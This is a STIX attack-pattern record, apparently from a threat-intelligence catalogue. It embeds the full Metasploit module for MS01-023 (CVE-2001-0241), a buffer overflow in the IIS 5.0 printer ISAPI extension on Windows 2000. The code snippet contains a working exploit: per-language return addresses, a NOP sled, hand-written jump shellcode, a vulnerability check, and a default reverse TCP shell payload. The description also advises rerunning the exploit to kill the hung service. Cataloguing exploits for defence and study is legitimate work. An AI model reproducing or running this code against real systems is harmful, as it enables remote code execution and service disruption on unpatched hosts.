{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9587978c-4ce4-483c-ba9b-b2ec8448824e",
    "created": "2024-08-14T16:48:40.61332Z",
    "modified": "2024-08-14T16:48:40.613324Z",
    "name": "MS01-023 Microsoft IIS 5.0 Printer Host Header Overflow",
    "description": " This exploits a buffer overflow in the request processor of the Internet Printing Protocol ISAPI module in IIS. This module works against Windows 2000 Server and Professional SP0-SP1.  If the service stops responding after a successful compromise run the exploit a couple more times to completely kill the hung process. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/iis/ms01_023_printer.rb",
            "external_id": "ms01_023_printer.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2001-0241"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/lists/bugtraq/2001/May/0005.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'MS01-023 Microsoft IIS 5.0 Printer Host Header Overflow',\n        'Description' => %q{\n          This exploits a buffer overflow in the request processor of the\n          Internet Printing Protocol ISAPI module in IIS. This module\n          works against Windows 2000 Server and Professional SP0-SP1.\n\n          If the service stops responding after a successful compromise,\n          run the exploit a couple more times to completely kill the\n          hung process.\n        },\n        'Author' => [ 'hdm' ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'CVE', '2001-0241'],\n          [ 'OSVDB', '3323'],\n          [ 'BID', '2674'],\n          [ 'MSB', 'MS01-023'],\n          [ 'URL', 'https://seclists.org/lists/bugtraq/2001/May/0005.html'],\n        ],\n        'Privileged' => false,\n        'Payload' => {\n          'Space' => 900,\n          'BadChars' => \"\\x00\\x0a\\x0b\\x0d\\x20\\x2f\\x3a\",\n          'StackAdjustment' => -3500\n        },\n        'Targets' => [\n          # jmp esp @ compfilt.dll\n          [ 'Windows 2000 SP0-SP1 (Arabic)', { 'Ret' => 0x732345f3 } ],\n          [ 'Windows 2000 SP0-SP1 (Czech)', { 'Ret' => 0x732645f3 } ],\n          [ 'Windows 2000 SP0-SP1 (Chinese)', { 'Ret' => 0x732245f3 } ],\n          [ 'Windows 2000 SP0-SP1 (Dutch)', { 'Ret' => 0x732745f3 } ],\n          [ 'Windows 2000 SP0-SP1 (English)', { 'Ret' => 0x732c45f3 } ],\n          [ 'Windows 2000 SP0-SP1 (French)', { 'Ret' => 0x732345f3 } ],\n          [ 'Windows 2000 SP0-SP1 (Finnish)', { 'Ret' => 0x732945f3 } ],\n          [ 'Windows 2000 SP0-SP1 (German)', { 'Ret' => 0x732345f3 } ],\n          # [ 'Windows 2000 SP0-SP1 (Greek)', { 'Ret' => 0x732045f3 } ], # contains 0x20\n          [ 'Windows 2000 SP0-SP1 (Korean)', { 'Ret' => 0x731e45f3 } ],\n          [ 'Windows 2000 SP0-SP1 (Hungarian)', { 'Ret' => 0x732445f3 } ],\n          [ 'Windows 2000 SP0-SP1 (Italian)', { 'Ret' => 0x732645f3 } ],\n          [ 'Windows 2000 SP0-SP1 (Portuguese)', { 'Ret' => 0x732645f3 } ],\n          [ 'Windows 2000 SP0-SP1 (Spanish)', { 'Ret' => 0x732645f3 } ],\n          [ 'Windows 2000 SP0-SP1 (Swedish)', { 'Ret' => 0x732945f3 } ],\n          [ 'Windows 2000 SP0-SP1 (Turkish)', { 'Ret' => 0x732545f3 } ],\n\n          # jmp esp @ ws2_32.dll\n          [ 'Windows 2000 Pro SP0 (Greek)', { 'Ret' => 0x74f862c3 } ],\n          [ 'Windows 2000 Pro SP1 (Greek)', { 'Ret' => 0x74f85173 } ],\n        ],\n        'Arch' => [ARCH_X86],\n        'Platform' => 'win',\n        'DefaultOptions' => {\n          'PAYLOAD' => 'windows/shell/reverse_tcp'\n        },\n        'Notes' => {\n          'Reliability' => [REPEATABLE_SESSION],\n          'Stability' => [CRASH_SERVICE_DOWN],\n          'SideEffects' => [IOC_IN_LOGS]\n        },\n        'DefaultTarget' => 4,\n        'DisclosureDate' => '2001-05-01'\n      )\n    )\n\n    register_options([\n      Opt::RPORT(80)\n    ])\n  end\n\n  def check\n    res = send_request_cgi({\n      'uri' => '/NULL.printer',\n      'version' => '1.0'\n    })\n\n    return CheckCode::Unknown('Connection failed') unless res\n    return CheckCode::Safe unless res.code == 500\n    # Error response is language dependent: \"<b>Error in web printer install.</b>\"\n    return CheckCode::Safe unless res.body.to_s.starts_with?('<b>') && res.body.to_s.ends_with?('</b>')\n\n    res = send_request_cgi({\n      'uri' => '/NULL.printer',\n      'vhost' => rand_text_alpha(257),\n      'version' => '1.0'\n    })\n\n    return CheckCode::Unknown('Connection failed') unless res\n    return CheckCode::Detected(\"The IUSER account is locked out, we can't check\") if res.body.to_s.include?('locked out')\n    return CheckCode::Safe unless res.code == 500\n    return CheckCode::Safe unless res.body.to_s.starts_with?('<b>') && res.body.to_s.ends_with?('</b>')\n\n    CheckCode::Appears\n  end\n\n  def exploit\n    print_status(\"Using target: #{target.name} ...\")\n\n    buf = make_nops(268)\n    buf << [target.ret].pack('V')\n    buf << make_nops(8)\n\n    # payload is at: [ebx + 96] + 256 + 64\n    buf << \"\\x8b\\x4b\\x60\"  # mov ecx, [ebx + 96]\n    buf << \"\\x80\\xc1\\x40\"  # add cl, 64\n    buf << \"\\x80\\xc5\\x01\"  # add ch, 1\n    buf << \"\\xff\\xe1\"      # jmp ecx\n\n    res = send_request_cgi({\n      'uri' => \"http://#{buf}/NULL.printer?#{payload.encoded}\",\n      'version' => '1.0'\n    }, 5)\n\n    # It is expected that we receive no reply. A reply indicates exploit failure.\n    fail_with(Failure::UnexpectedReply, \"#{res.code} #{res.message}\") if res\n  end\nend\n",
    "x_mitre_disclosure_date": "2001-05-01",
    "x_mitre_platforms": [
        "win'"
    ]
}